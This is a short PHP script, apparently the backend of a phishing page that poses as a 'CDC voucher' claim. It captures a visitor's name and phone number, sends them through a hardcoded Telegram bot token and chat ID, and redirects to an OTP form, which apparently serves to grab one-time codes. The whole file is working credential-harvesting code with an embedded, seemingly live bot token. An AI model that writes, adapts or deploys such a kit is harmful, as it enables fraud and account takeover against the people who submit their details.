<?php
// send_to_telegram.php
session_start(); // Start the session

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the form data
    $full_name = isset($_POST['name']) ? $_POST['name'] : '';
    $phone_number = isset($_POST['phoneNumber']) ? $_POST['phoneNumber'] : '';

    // Save the phone number in session
    $_SESSION['phone_number'] = $phone_number;

    // Your Telegram Bot Token and Chat ID
    $bot_token = '7672236652:AAHZDwEh11fH6TUpAzALYdnNWfa2mT7wiCE';  // Replace with your bot token
    $chat_id = '6551804744';      // Replace with your chat ID

    // Prepare the message
$message = "📋 *CDC_voucher Ress*\n"; // Add emoji and bold text

$message .= "👤 *Nama:* " . $full_name . "\n"; // Add an icon and format

$message .= "📞 *Nomor:* `" . $phone_number . "`\n"; // Add an icon and format
$message .= "🕒 *Waktu:* " . date("Y-m-d H:i:s") . "\n"; // Add submission time

// URL-encode the message with Markdown for formatting
$url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message) . "&parse_mode=Markdown";


    // Send the message using file_get_contents
    $response = file_get_contents($url);

    // Check if the message was sent successfully
    if ($response) {
        // Redirect to OTP form after sending the initial data
        header("Location: verify.html"); // Create an OTP form page
        exit();
    } else {
        echo "Failed to send message.";
    }
} else {
    echo "Invalid request.";
}
?>
